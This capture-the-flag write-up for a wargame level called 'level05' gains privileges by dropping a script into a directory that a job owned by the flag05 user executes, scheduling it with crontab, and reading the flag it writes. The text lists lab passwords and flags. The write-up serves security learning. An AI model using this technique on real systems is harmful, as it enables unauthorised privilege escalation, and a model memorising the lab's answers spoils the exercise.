# level05

## Vulnerability: Wildcard trickery

level05's password: `ne2searoevaevoem4ov4ar8ap`

we got some intel from level00:

```shell
-rwxr-x---+ 1 flag05  flag05      94 Mar  5  2016 openarenaserver
/opt/openarenaserver
/usr/sbin/openarenaserver
/rofs/opt/openarenaserver
/rofs/usr/sbin/openarenaserver
```

1. examinate existing files and permissions

```shell
ls -la
ls -la /usr/sbin/openarenaserver
cat /usr/sbin/openarenaserver
```

shows a shell script that runs all scripts in `/opt/openarenaserver`, and that the process is running as flag05

2. create an exploit script

```shell
echo -e "getflag > /opt/openarenaserver/flag" > /opt/openarenaserver/exploit.sh
```

3. make it run as flag05 with flag05 script and crontab

```shell
crontab -e
* * * * * /opt/openarenaserver/exploit.sh
```

to execute exploit every minute

4. wait crontab's execution (next minute second 0) then pwn the flag

```shell
uptime
cat /opt/openarenaserver/flag
```

gives flag: `viuaaale9huek52boumoomioc`
